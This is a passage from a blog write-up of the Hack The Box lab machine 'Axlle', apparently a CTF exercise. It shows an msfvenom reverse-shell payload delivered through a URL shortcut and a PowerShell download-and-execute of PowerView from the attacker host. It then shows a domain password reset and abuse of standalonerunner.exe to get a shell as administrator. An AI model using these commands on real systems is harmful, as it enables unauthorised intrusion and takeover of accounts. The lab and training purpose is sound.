<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">konoha# msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9002 -f exe &gt; s.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 460 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br></pre></td></tr></table></figure>
<p>Transfer to the box and set up our shortcut.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># web shortcut</span><br><span class="line">[internetshortcut]</span><br><span class="line">C:\\ProgramData\s.exe</span><br></pre></td></tr></table></figure>
<p>We can then upload it and wait for our callback.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">konoha# rlwrap -cAr nc -lvnp 9002</span><br><span class="line">listening on [any] 9002 ...</span><br><span class="line">connect to [10.10.14.7] from (UNKNOWN) [10.10.11.21] 53229</span><br><span class="line">Microsoft Windows [Version 10.0.20348.2527]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">axlle\dallon.matrix</span><br></pre></td></tr></table></figure>
<p><img src="/img/perfect.gif"></p>
<h2 id="Abuse-the-bully"><a href="#Abuse-the-bully" class="headerlink" title="Abuse the bully"></a>Abuse the bully</h2><p>Now we know weâ€™re apart of the <code>Web Devs</code> group fom the ACLs output. We can simply change the password for <code>jacob.greeny</code> using <code>PowerView.ps1</code>.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;powershell <span class="literal">-ep</span> bypass</span><br><span class="line">powershell <span class="literal">-ep</span> bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">Install the latest PowerShell <span class="keyword">for</span> new features and improvements! https://aka.ms/PSWindows</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">IEX</span>((<span class="built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="string">&#x27;http://10.10.14.7/PowerView.ps1&#x27;</span>))</span><br><span class="line"><span class="built_in">IEX</span>((<span class="built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="string">&#x27;http://10.10.14.7/PowerView.ps1&#x27;</span>))</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$cred</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;Welcome123!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;Welcome123!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-DomainUserPassword</span> <span class="literal">-Identity</span> jacob.greeny <span class="literal">-AccountPassword</span> <span class="variable">$cred</span> <span class="literal">-Verbose</span></span><br><span class="line"><span class="built_in">Set-DomainUserPassword</span> <span class="literal">-Identity</span> jacob.greeny <span class="literal">-AccountPassword</span> <span class="variable">$cred</span> <span class="literal">-Verbose</span></span><br><span class="line">VERBOSE: [<span class="built_in">Set-DomainUserPassword</span>] Attempting to <span class="built_in">set</span> the password <span class="keyword">for</span> user <span class="string">&#x27;jacob.greeny&#x27;</span></span><br><span class="line">VERBOSE: [<span class="built_in">Set-DomainUserPassword</span>] Password <span class="keyword">for</span> user <span class="string">&#x27;jacob.greeny&#x27;</span> successfully reset</span><br></pre></td></tr></table></figure>

<h2 id="Pure-Evil"><a href="#Pure-Evil" class="headerlink" title="Pure Evil"></a>Pure Evil</h2><p>Jacob gets us a WinRM session on the box. Looking at bloodhound we weâ€™re part of the <code>App Devs</code> group. </p>
<p><img src="/img/axlle2.png"></p>
<p>Looking back at the root we did have a directory we couldnâ€™t access called <code>App Development</code>. This directory has a <code>README.md</code> stating that the aim of this application is to allow users to program and simulate custom keyboard layouts. Devs must be building something for their clients or vendors.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\App Development\kbfiltr&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\App Development\kbfiltr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>          <span class="number">1</span>/<span class="number">1</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">03</span> PM                exe</span><br><span class="line">d<span class="literal">-----</span>          <span class="number">1</span>/<span class="number">1</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">03</span> PM                sys</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">12</span>/<span class="number">14</span>/<span class="number">2023</span>  <span class="number">11</span>:<span class="number">39</span> AM           <span class="number">2528</span> kbfiltr.sln</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">6</span>/<span class="number">11</span>/<span class="number">2024</span>  <span class="number">11</span>:<span class="number">16</span> PM           <span class="number">2805</span> README.md</span><br></pre></td></tr></table></figure>

<p><code>**NOTE: I have automated the running of &#39;C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe&#39; as SYSTEM to test and debug this driver in a standalone environment**</code></p>
<p>It states that <code>standalonerunner.exe</code> is running as <code>SYSTEM</code> to test and debug the driver. If we look up more on the <code>exe</code> we find an <a target="_blank" rel="noopener" href="https://github.com/nasbench/Misc-Research/blob/main/LOLBINs/StandaloneRunner.md">article</a> stating that we can gain arbitrary command execution by making a couple of files and a <code>command.txt</code> that will be our binary to execute. </p>
<h2 id="Privilege-for-the-Strong"><a href="#Privilege-for-the-Strong" class="headerlink" title="Privilege for the Strong"></a>Privilege for the Strong</h2><p>After reading the github on this vulnerablility I came up with a little one liner, as Iâ€™m sure most did. First we must go to the directory where the <code>exe</code> and <code>dll</code> reside. We can use the same reverse shell we created with <code>msfvenom</code> for our <code>command.txt</code>.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Program Files (x86)\Windows Kits\<span class="number">10</span>\Testing\StandaloneTesting\Internal\x64&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files (x86)\Windows Kits\<span class="number">10</span>\Testing\StandaloneTesting\Internal\x64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">-a----</span>         <span class="number">9</span>/<span class="number">30</span>/<span class="number">2023</span>   <span class="number">3</span>:<span class="number">08</span> AM          <span class="number">33392</span> standalonerunner.exe</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">9</span>/<span class="number">30</span>/<span class="number">2023</span>   <span class="number">3</span>:<span class="number">08</span> AM          <span class="number">43632</span> standalonexml.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Program Files (x86)\Windows Kits\<span class="number">10</span>\Testing\StandaloneTesting\Internal\x64&gt; <span class="built_in">echo</span> <span class="string">&quot;myTestDir`nTrue&quot;</span> &gt; reboot.rsf ; mkdir <span class="literal">-p</span> myTestDir\working ; <span class="built_in">echo</span> <span class="string">&quot; &quot;</span> &gt; myTestDir\working\rsf.rsf ; <span class="built_in">echo</span> <span class="string">&quot;C:\\ProgramData\s.exe&quot;</span> &gt; command.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files (x86)\Windows Kits\<span class="number">10</span>\Testing\StandaloneTesting\Internal\x64\myTestDir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>         <span class="number">6</span>/<span class="number">24</span>/<span class="number">2025</span>   <span class="number">3</span>:<span class="number">03</span> PM                working</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Program Files (x86)\Windows Kits\<span class="number">10</span>\Testing\StandaloneTesting\Internal\x64&gt; <span class="string">&quot;C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe&quot;</span></span><br><span class="line">C:\Program Files (x86)\Windows Kits\<span class="number">10</span>\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe</span><br></pre></td></tr></table></figure>
<p>After a couple of minutes we recieve a shell back.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">konoha# rlwrap -cAr nc -lvnp 9002</span><br><span class="line">listening on [any] 9002 ...</span><br><span class="line">connect to [10.10.14.7] from (UNKNOWN) [10.10.11.21] 52931</span><br><span class="line">Microsoft Windows [Version 10.0.20348.2527]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\myTestDir\working&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">axlle\administrator</span><br></pre></td></tr></table></figure>

<p><img src="/img/robocop.gif"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/xll/">xll</a><a class="post-meta__tags" href="/tags/phishing/">phishing</a><a class="post-meta__tags" href="/tags/shortcuts/">shortcuts</a><a class="post-meta__tags" href="/tags/DACL-Abuse/">DACL Abuse</a><a class="post-meta__tags" href="/tags/LOLBIN/">LOLBIN</a></div><div class="post-share"><div class="social-share" data-image="/img/axlle.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/06/30/Voleur/" title="Voleur (Windows Medium)"><img class="cover" src="/img/voleur.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Voleur (Windows Medium)</div></div><div class="info-2"><div class="info-item-1"> Voleur starts with credentials, but after a nmap you find NTLM is disabled. Using kerberos, we are able to get a bloodhound dump. Checking the shares reveals a xlsx file, we can convert it and crack it. Once done, we get access to a excel file with some users and passwords, one user has be deleted. Once on the box, we lateral move to ldap_svc, and find a user that has been deleted. Using powershell, we restore them and then get a shell using the password found from the xlsx file. Then we do to the next directory in the IT share, and find a archived users directory which hold DPAPI credentials. After obtaining the credentials, we find our user able to access a backup in the next directory that contains the SAM, SECURITY, and NTDS files used to dump the Administrator hash. As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor &#x2F; HollowOct31Nyt Initial...</div></div></div></a><a class="pagination-related" href="/2025/05/26/Fluffy/" title="Fluffy (Windows Easy)"><img class="cover" src="/img/fluffy.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Fluffy (Windows Easy)</div></div><div class="info-2"><div class="info-item-1"> Starts with CVE-2025-24996, which is used to retrieve the hash of p.agila. This user Owns the Service Accounts OU, and can add themselves. Once done they have GenericWrite, and GenericAll which we can utilize for Shadow Credentials and obtain the hash for winrm_svc and other corresponding service accounts (ldap_svc, ca_svc). Having the ca_svc who is in Cert Publishers, we find a vulnerable template within ADCS. ESC 16 allows a low-privileged user to escalate their privilege. In doing so, we update the ca_svc account upn to administrator then request a pfx. This give us the administrator.pfx. Now we change back the upn for ca_svc and we authenticate with the administrator.pfx giving us the administrator hash. As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: rr.j.fleischman &#x2F; J0elTHEM4n1990! Initial Nmap123456789101112PORT     STATE SERVICE          REASON53/tcp   open  domain           syn-ack88/tcp   open ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jay</div><div class="author-info-description">An aspiring hacker and a CTF player</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/itzgottabejay" target="_blank" title="Github"><i class="fab fa-github" style="color: #E2E6E6;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/ianberdahl/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #007aff;"></i></a><a class="social-icon" href="https://app.hackthebox.com/profile/420575" target="_blank" title="HackTheBox"><i class="fa-solid fa-cube" style="color: #2dfc04;"></i></a><a class="social-icon" href="https://www.instagram.com/junkie_mayhem/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #833AB4;"></i></a><a class="social-icon" href="https://x.com/deadcyberninja" target="_blank" title="X"><i class="fab fa-x-twitter" style="color: #000404;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I like to put things here for safe keeping ðŸ”ðŸ”</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Intial-Nmap"><span class="toc-number">1.</span> <span class="toc-text">Intial Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Http-for-me"><span class="toc-number">2.</span> <span class="toc-text">Http for me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Excelling-at-everything"><span class="toc-number">3.</span> <span class="toc-text">Excelling at everything</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phishing-for-entry"><span class="toc-number">4.</span> <span class="toc-text">Phishing for entry</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Further-enumeration-required"><span class="toc-number">5.</span> <span class="toc-text">Further enumeration required</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#I-smell-Mail"><span class="toc-number">6.</span> <span class="toc-text">I smell Mail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Abuse-the-bully"><span class="toc-number">7.</span> <span class="toc-text">Abuse the bully</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pure-Evil"><span class="toc-number">8.</span> <span class="toc-text">Pure Evil</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-for-the-Strong"><span class="toc-number">9.</span> <span class="toc-text">Privilege for the Strong</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/n8.jpg);"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="IM,WATCHING,YOU" data-fontsize="21px" data-random="false" async="async"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Where do you want to go?" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>